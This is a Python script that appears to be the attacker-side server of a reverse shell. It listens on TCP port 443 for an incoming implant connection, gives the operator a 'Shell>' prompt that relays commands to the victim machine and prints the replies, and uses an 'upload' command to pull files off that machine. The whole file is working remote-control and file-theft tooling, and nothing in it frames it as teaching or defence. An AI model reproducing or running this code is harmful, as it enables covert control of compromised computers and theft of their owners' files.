import socket
import os
import time

l = 20480
def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split("*")
    file_name=os.path.basename(path)
    print("filename:"+file_name)
    f = open (file_name,'wb')
    while True:
        bits = conn.recv(l)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed')
            break
        if bits.endswith('File not found'.encode()):
            print('[-] Unable to find out the file')
            break
        f.write(bits)

def connect():
    s = socket.socket()
    port = 443
    s.bind(("0.0.0.0",port))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port '+str(port))
    conn , addr = s.accept()
    print('[+] We got a connection from', addr)
    while True:
        command = input("Shell> ")
        if 'exit' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif 'upload' in command:
            transfer(conn,command)
        else:
            try:
                conn.send(command.encode())
                time.sleep(1)
                data = conn.recv(l)
                print(data.decode())
            except ValueError as ve:
                print(ve)
connect()
